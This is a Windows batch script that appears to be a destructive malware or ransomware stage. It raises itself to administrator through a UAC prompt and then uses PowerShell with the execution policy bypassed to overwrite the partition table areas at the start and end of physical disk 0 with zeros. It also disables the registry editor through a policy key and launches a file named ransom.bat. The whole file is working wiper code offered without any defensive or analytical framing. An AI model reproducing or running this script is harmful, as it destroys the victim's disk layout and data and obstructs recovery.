@echo off
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------  

powershell -ExecutionPolicy Bypass -Command ^
    "$disk = Get-PhysicalDisk | Where-Object { $_.DeviceId -eq 0 }; " ^
    "if (!$disk) { throw 'Disk 0 not found' }; " ^
    "$diskSizeBytes = $disk.Size; " ^
    "$drive = '\\.\PhysicalDrive0'; " ^
    "$fs = New-Object IO.FileStream($drive, 'Open', 'ReadWrite', 'None'); " ^
    "$fs.Position = 512; " ^
    "$fs.Write([byte[]](,0 * 20480), 0, 20480); " ^
    "$backupSafeStart = $diskSizeBytes - 20480; " ^
    "if ($backupSafeStart -gt 0) { $fs.Position = $backupSafeStart; $fs.Write([byte[]](,0 * 20480), 0, 20480) }; " ^
    "$fs.Dispose()"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
start %localappdata%\ransom.bat
